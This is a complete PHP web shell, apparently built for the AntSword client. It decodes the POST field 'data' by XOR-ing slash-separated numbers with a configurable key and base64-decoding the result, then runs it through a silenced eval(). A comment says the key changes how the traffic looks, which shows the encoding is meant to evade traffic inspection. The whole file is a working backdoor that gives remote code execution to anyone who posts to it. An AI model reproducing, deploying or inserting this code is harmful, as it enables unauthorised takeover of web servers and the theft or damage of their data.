<?php
// $number is the value to XOR with the traffic.After modification, the traffic will be different.You must config it be consistent with AntSword.
// $number变量为与流量异或的值 修改后流量会变得不一样。必须配置与蚁剑端一致
$number=2;
function decoder($s,$number){
	$res = '';
	$s = rtrim($s,'/');
	$s = explode('/',$s);
	foreach ($s as $key => $value) {
		$res .= chr($value^$number);
	}
	return base64_decode($res);
}
$a = decoder($_POST['data'],$number);
@eval($a)
?>